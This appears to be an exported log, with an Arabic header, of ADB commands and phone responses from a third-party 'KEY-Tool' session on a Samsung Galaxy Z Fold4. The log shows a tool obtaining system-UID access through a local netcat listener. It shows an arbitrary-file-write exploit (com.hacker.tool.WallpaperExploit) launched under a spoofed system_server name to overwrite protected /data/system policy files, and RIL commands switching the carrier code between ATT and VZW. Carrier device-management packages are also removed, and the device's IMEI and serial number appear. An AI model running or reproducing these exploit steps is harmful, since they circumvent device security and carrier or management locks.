@@ -1,0 +1,270 @@
+﻿=== سجل الأوامر المنظم (Structured Phone Commands Log) ===
+تاريخ التصدير: 10/17/2026 2:23:17 AM
+إجمالي الأوامر الصافية المصدرة: 75
+حالة تضمين رد الهاتف: مفعّل (ON)
+============================================================
+
+[ADB-SHELL]
+pm list package|grep rsuapp
+---------------------------------------------
+[ADB-SHELL]
+ps -A|grep tsdaemon;ps|grep tsdaemon
+---------------------------------------------
+[ADB-SHELL]
+getprop
+رد الهاتف: ro.product.model=SM-F936U1
+---------------------------------------------
+[ADB-SHELL]
+service call iphonesubinfo 1 s16 com.android.shell
+رد الهاتف: Result: Parcel( | 0x00000000: 00000000 0000000f 00350033 00390036 '........3.5.6.9.' | 0x00000010: 00340035 00370034 00310034 00300032 '5.4.4.7.4.1.2.0.' | 0x00000020: 00320030 00000037                   '0.2.7...        ')
+---------------------------------------------
+[ADB-SHELL]
+getenforce
+رد الهاتف: Enforcing
+---------------------------------------------
+[ADB-SHELL]
+pm list package|grep rsuapp
+---------------------------------------------
+[ADB-SHELL]
+ps -A|grep tsdaemon;ps|grep tsdaemon
+---------------------------------------------
+[ADB-SHELL]
+getprop
+رد الهاتف: ro.boot.serialno=RFCT71GB10R | sys.usb.config=sec_charging,adb
+---------------------------------------------
+[ADB-SHELL]
+service call iphonesubinfo 1 s16 com.android.shell
+رد الهاتف: Result: Parcel( | 0x00000000: 00000000 0000000f 00350033 00390036 '........3.5.6.9.' | 0x00000010: 00340035 00370034 00310034 00300032 '5.4.4.7.4.1.2.0.' | 0x00000020: 00320030 00000037                   '0.2.7...        ')
+---------------------------------------------
+[ADB-SHELL]
+getenforce
+رد الهاتف: Enforcing
+---------------------------------------------
+[ADB-SHELL]
+pm path KEYTool.SRV4
+رد الهاتف: package:/data/app/~~4M3vRKDvOnGywp-mBaaZbA==/KEYTool.SRV4-3VbNU7aA1PzcgLIn0GjxPA==/base.apk
+---------------------------------------------
+[ADB-SHELL]
+echo 'id' |toybox nc localhost 2600
+رد الهاتف: uid=1000(system) gid=1000(system) groups=1000(system),1002(bluetooth),1005(audio),1007(log),1065(reserved_disk),1077(external_storage),1079(ext_obb_rw),1096(update_engine_log),2001(cache),2002(diag),2901(vendor_qti_diag),2902(vendor_qdss),2905(vendor_adpl_odl),3001(net_bt_admin),3002(net_bt),3003(inet),3007(net_bw_acct),3010(wakelock),3011(uhid),5050(vendor_secdir),9997(everybody) context=u:r:system_app:s0 | Purple Diag Serial: uid=1000(system) gid=1000(system) groups=1000(system),1002(bluetooth),1005(audio),1007(log),1065(reserved_disk),1077(external_storage),1079(ext_obb_rw),1096(update_engine_log),2001(cache),2002(diag),2901(vendor_qti_diag),2902(vendor_qdss),2905(vendor_adpl_odl),3001(net_bt_admin),3002(net_bt),3003(inet),3007(net_bw_acct),3010(wakelock),3011(uhid),5050(vendor_secdir),9997(everybody) context=u:r:system_app:s0
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/AT
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/AT
+---------------------------------------------
+[ADB-AT-TOOL]
+/data/local/tmp/AT
+رد الهاتف: ****** -------- 2025-||-2026 -------- ****** | ****   SAMSUNG AT Ril Command TOOL V4   **** | ** -------    BY KEY-Tool Team    ------- ** | Product Name  : samsung | Product Model : SM-F936U1 | Device Carrier: XAA | Build  Number : F936U1UES8IZA1 | Android Ver   : 16 | Security Patch: 2026-01-01 | To | ken AuthKey: 80D40B25734018FDBF7298E00AA62352B4C5AA56BDFD747B8937440DED7C75B3 | Enter AuthKey:
+---------------------------------------------
+[ADB-AT-RIL]
+AAC9B388B130F85ABDD44BB26CC948671C7C7F2892FE1E6D7557D90BB4BEE71D73B7C88CD44B0BF56F1D0444B3558A7FD4028A5E762A6D30821E6FE5F18302BC3F13EAD8DEE8E1BE9E731D9557790758C2109DEA04D5CE5A5117B50CD968AF7C7B71252C2F682AE05DD64F79CFCFB27FD239AEBB89FAE3A488AA94F0A1FC07EE21AA56972261EDF509523B8563957C20823A6F97AE746CB22B1B031F5386A24532DC20F1F5375F79B4800C9D1F69B0B4AD71A590EBAA2998A4F04B4BF0EC4E7D47D22E6F6C1FD384F562554527FD8952E7DC7088924B76D74BB09A1F55E0A0AB479CA41F849A6AEB8D15BCF8CE419FFE1445434FFF48346E96C7D3969AE205A9
+رد الهاتف: AuthKey : OK | AuthKey Encrypt :
+---------------------------------------------
+[ADB-AT-RIL]
+26131C22EEAAA70EC6B80D2585CB4D402A8FBDDB76B7FB39F68862CE7A1333A9424B580483A1B8EF861012365D56A15B28B5861E6634A246FBF3A58607753AAB007AB3565908D16C1A93921F2E1A218B49D5F5906CCF54E5C4106F5F7414364424331CAF12FD2F5032C86B98AA72318AF2082BE73A89254BEBEC647903326CFA7F029AFC1EC9AF4DFDCF12B39E853551F74DBB49C4FAF7914D961AAF85081A3FB799EC1BB6B47C60389CC058DB777351155B39B76A67E3C9E012499553CD3C1B4911FD173D416213F947B6465F02E0EDC3689EFFB1ADDFAD8CEBAC1CD3D78C6AF60B68C4C92E3F63D940F050477DABEA25161512CB087FCA58A38FDAE69548A9
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-SHELL]
+logcat -b radio -c
+---------------------------------------------
+[ADB-AT-RIL]
+0601000e00004154540000415454  [ASCII: ATT]
+رد الهاتف: OK | # | OK
+---------------------------------------------
+[ADB-AT-RIL]
+060100090000415454  [ASCII: ATT]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+0601001200004154540000415454415454  [ASCII: ATT | ATTATT]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+060100120000
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+060100090000415454  [ASCII: ATT]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-SHELL]
+pm uninstall -k --user 0 com.sec.android.AutoPreconfig;pm uninstall -k --user 0 com.sec.omadmspr;pm clear com.samsung.android.app.mobiledoctor
+رد الهاتف: OK | Failure [not installed for 0] | Failed
+---------------------------------------------
+[ADB-MODE]
+usb:
+رد الهاتف: restarting in USB mode
+---------------------------------------------
+[ADB-SHELL]
+pm list package|grep rsuapp
+---------------------------------------------
+[ADB-SHELL]
+ps -A|grep tsdaemon;ps|grep tsdaemon
+---------------------------------------------
+[ADB-SHELL]
+getprop
+رد الهاتف: ro.product.model=SM-F936U1
+---------------------------------------------
+[ADB-SHELL]
+service call iphonesubinfo 1 s16 com.android.shell
+رد الهاتف: Result: Parcel( | 0x00000000: 00000000 0000000f 00350033 00390036 '........3.5.6.9.' | 0x00000010: 00340035 00370034 00310034 00300032 '5.4.4.7.4.1.2.0.' | 0x00000020: 00320030 00000037                   '0.2.7...        ')
+---------------------------------------------
+[ADB-SHELL]
+getenforce
+رد الهاتف: Enforcing
+---------------------------------------------
+[ADB-SHELL]
+pm path KEYTool.SRV4
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/SRV4
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/SRV4
+---------------------------------------------
+[ADB-SHELL]
+pm install -r /data/local/tmp/SRV4
+رد الهاتف: Success
+---------------------------------------------
+[ADB-SHELL]
+echo 'id' |toybox nc localhost 2600
+رد الهاتف: nc: connect: Connection refused
+---------------------------------------------
+[ADB-SHELL]
+svc power stayon true
+---------------------------------------------
+[ADB-SHELL]
+dumpsys package com.samsung.android.app.repaircal | grep -E "versionName|versionCode"
+---------------------------------------------
+[ADB-SHELL]
+dumpsys package com.samsung.android.app.mobiledoctor | grep -E "versionName|versionCode"
+---------------------------------------------
+[ADB-SHELL]
+dumpsys package com.samsung.rms.retailagent.global | grep -E "versionName|versionCode"
+---------------------------------------------
+[ADB-SHELL]
+dumpsys package com.samsung.rms.retailagent.global_lite | grep -E "versionName|versionCode"
+---------------------------------------------
+[ADB-SHELL]
+dumpsys package com.samsung.android.app.repaircal | grep -E "versionName|versionCode"
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/retail/ADP.xml
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/retail/ASKSW.xml
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/retail/ASKSW.xml
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/retail/classes.dex
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/retail/classes.dex
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/retail/trustedTime
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/retail/trustedTime
+---------------------------------------------
+[ADB-SHELL]
+chmod 0777 /data/local/tmp/retail/*;CLASSPATH=/data/local/tmp/retail/classes.dex app_process /system/bin --nice-name=system_server com.hacker.tool.WallpaperExploit /data/local/tmp/retail/ADP.xml /data/system/.aasa/AASApolicy/ADP.xml;CLASSPATH=/data/local/tmp/retail/classes.dex app_process /system/bin --nice-name=system_server com.hacker.tool.WallpaperExploit /data/local/tmp/retail/trustedTime /data/system/.aasa/trustedTime;CLASSPATH=/data/local/tmp/retail/classes.dex app_process /system/bin --nice-name=system_server com.hacker.tool.WallpaperExploit /data/local/tmp/retail/ASKSW.xml /data/system/.aasa/AASApolicy/ASKSW.xml
+رد الهاتف: [*] Starting Generic Arbitrary File Write Exploit via Transaction 2... | [*] Source file: /data/local/tmp/retail/ADP.xml | [*] Target file: /data/system/.aasa/AASApolicy/ADP.xml | [*] Firing Payload... | [*] Payload Method 1 | [-] Transaction Rejected: Unknown URI type: 3014756 | [*] Payload Method 2 | [+] Exploit transaction sent successfully! | [+] Copied: /data/local/tmp/retail/ADP.xml -> /data/system/.aasa/AASApolicy/ADP.xml | format must be set before data is written | Aborted (core dumped) | [*] Starting Generic Arbitrary File Write Exploit via Transaction 2... | [*] Source file: /data/local/tmp/retail/trustedTime | [*] Target file: /data/system/.aasa/trustedTime | [+] Exploit transaction sent successfully! | [+] Copied: /data/local/tmp/retail/trustedTime -> /data/system/.aasa/trustedTime | format must be set before data is written | [*] Starting Generic Arbitrary File Write Exploit via Transaction 2... | [*] Source file: /data/local/tmp/retail/ASKSW.xml | [*] Target file: /data/system/.aasa/AASApolicy/ASKSW.xml | [+] Exploit transaction sent successfully! | [+] Copied: /data/local/tmp/retail/ASKSW.xml -> /data/system/.aasa/AASApolicy/ASKSW.xml | format must be set before data is written
+---------------------------------------------
+[ADB-SHELL]
+rm -rf /data/local/tmp/retail
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/R2.zip
+---------------------------------------------
+[ADB-SHELL]
+unzip /data/local/tmp/R2.zip -o -d /data/local/tmp/
+رد الهاتف: Archive:  /data/local/tmp/R2.zip | inflating: /data/local/tmp/R2
+---------------------------------------------
+[ADB-SHELL]
+rm -r /data/local/tmp/R2.zip
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/R2
+---------------------------------------------
+[ADB-SHELL]
+pm install -r /data/local/tmp/R2
+رد الهاتف: Success | CLSE
+---------------------------------------------
+[ADB-SHELL]
+rm -r /data/local/tmp/R2
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/AT
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/AT
+---------------------------------------------
+[ADB-AT-TOOL]
+/data/local/tmp/AT R2
+رد الهاتف: ****** -------- 2025-||-2026 -------- ****** | ****      Samsung System UID Tools      **** | ** -------    BY KEY-Tool Team    ------- ** | Product Name  : samsung | Product Model : SM-F936U1 | Serial Number : RFCT71GB10R | Device IMEI   : 356954474120027 | Build  Number : F936U1UES8IZA1 | Android Ver   : 16 | Security Patch: 2026-01-01 | Token AuthKey: 365CA492FC0F4D9A8AC3FA67E1ECE76637C86D83F992C297CA3ACDAAB0EC5C90 | Enter AuthKey:
+---------------------------------------------
+[ADB-AT-RIL]
+04745B4DA54AB440E44DA87AAB98DF1C6D839E8F8E84EC570CEA00E55D074A19EE9C4E059945925058E9D85F2467AA70CFDCB2EE512E62BEC693BD08A324B6D92957748F5573D98D7F494440705235163E716C0209B907CCC8A433693370C87EEC912B43F102DB4882A69D7DBA69674D61E1EFFC2C547872540DC0E436901A7CFA6C714B61D5BEC02068CC16467D831D0D3541E9DFFBF37876614D61017A0EFEEED1A481B7C8B1598D03A089CAC47202B2FB58BADA0C2A9050A04EC484DA8422A15E749304D3E7FE0C71B8130226E6CD93129E594F125826217189217A8EE8848B4E128007E614FE87B4B685AE2D89B066DB2D9C3B5CA9E0EC82A4B31C575317
+رد الهاتف: AuthKey : OK | AuthKey Encrypt :
+---------------------------------------------
+[ADB-AT-RIL]
+9D85EF27F67832956C2CBFE159AE9AF01F2E30DE1247AEA1AF4A408C1543392A6882650E394496C395B45955E3674D32EC254279F1B5093B3CE9C33ADD4BCD8A9D776403F33F0778CE68381EE85825C8BCF37A1D856D620157ACCCCACEB31A909B6487BF43D8F0BBB97583568009BAFBA25B6976D2F7F55BEAFF45191218CF2FAA02A1C4EED211B1087A866DF769ACDCBFD0A8A389B4E91C8C567B4227D95CD3D4DBB4A66808C0062367D1997B239120B2C02D4AFA806193A7DE0EDA4B3C101C43FC82CD5A82E1F74F7B9E2D7CA1DE904EFFFDBFD7DC1AA04A5B8255E17A3C7918B7C801065CB724CAB7616F3FD6F89986E1EA9555151D739C0759227C06C404
+رد الهاتف: nc: connect: Connection refused | UID 1000 confirmed
+---------------------------------------------
+[ADB-SHELL]
+echo 'setprop ctl.stop ssud'|toybox nc localhost 2600
+---------------------------------------------
+[ADB-PUSH]
+/data/local/tmp/AT
+---------------------------------------------
+[ADB-SHELL]
+chmod 777 /data/local/tmp/AT
+---------------------------------------------
+[ADB-AT-TOOL]
+/data/local/tmp/AT
+رد الهاتف: ****** -------- 2025-||-2026 -------- ****** | ****   SAMSUNG AT Ril Command TOOL V4   **** | ** -------    BY KEY-Tool Team    ------- ** | Product Name  : samsung | Product Model : SM-F936U1 | Device Carrier: XAA | Build  Number : F936U1UES8IZA1 | Android Ver   : 16 | Security Patch: 2026-01-01 | To | ken AuthKey: 548758A9E9107139EB0052E49C1A91BA03442B47F715C5337522BD3F11ACBA3B | Enter AuthKey:
+---------------------------------------------
+[ADB-AT-RIL]
+1E30042CAB4C832C8708E28E34EA77212A7A3BE935A8FC24F5405B514AE735FBA9F854193646244E1648DC999E39EA9640D66AECB1A761E854FD1B5091F6666DEB078333E561F79C2F7A093536CA9F2838CD8CAD80C4EB84441BBC5D8681F4499F2B81F6E1C5AF58BE16E796721F843A42C28CD509FCC4D39F49107CCD9E5910BD4AA11BAC5B8CD8E1297195D48E284902896596C0AD2D7F2007F06C82CD0CF328CCA9AC57184F5C36DAD74B9BBCE8BDACBDAFDECB8C8F77C62903CF8B55423491A0F265987903444DB4F164A0898FC7B402EFBCD255476A132B08CDCBB04AD66331AD91B00F21BE65FFC52F43ADDA2E3A05042E955EB551C3E8556AD10D1E59
+رد الهاتف: AuthKey : OK | AuthKey Encrypt :
+---------------------------------------------
+[ADB-AT-RIL]
+147C898EA5CE654F348265430DFF420C955D0910E122984C087A66FF59A7B426638ED2249469330FE815DA23822C59250D935AD824507A2AD40787AE7A13DE8C6FB7B1A1A235A5FD6733F7B25190CCA31BC3E2D66A9DC675212CC89880D1A642D75BA5F6818CC002DA4687495BC370ED95E3D6B0381F898BB8970E164ED9B69E8B11363452D53724633BF81C6777C34AD948973ED2B8449AB5FDA9E7B98FDD239DC9E1AFA03F4CA75D40FF866D7C2BCB4B610BF5B82DC8F6E38AC41EFCFB61F56C59A099FE39EF2A9167523267538EF91EC3E5F7698BFF48014FDAA65E3BC7C7E57859835A17D579FB5E90A4D2010B7903F3C757EE468CA7E8CAA7E785638FB4
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-SHELL]
+logcat -b radio -c
+---------------------------------------------
+[ADB-AT-RIL]
+0601000e0000565a570000565a57  [ASCII: VZW]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+060100090000565A57  [ASCII: VZW]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+060100120000565a570000565a57565a57  [ASCII: VZW | VZWVZW]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+060100120000
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-AT-RIL]
+060100090000565a57  [ASCII: VZW]
+رد الهاتف: OK | #
+---------------------------------------------
+[ADB-SHELL]
+pm uninstall -k --user 0 com.sec.android.AutoPreconfig;pm uninstall -k --user 0 com.sec.omadmspr;pm clear com.samsung.android.app.mobiledoctor
+رد الهاتف: Failure [not installed for 0] | OK | Failed
+---------------------------------------------
+[ADB-MODE]
+usb:
+رد الهاتف: restarting in USB mode
+---------------------------------------------
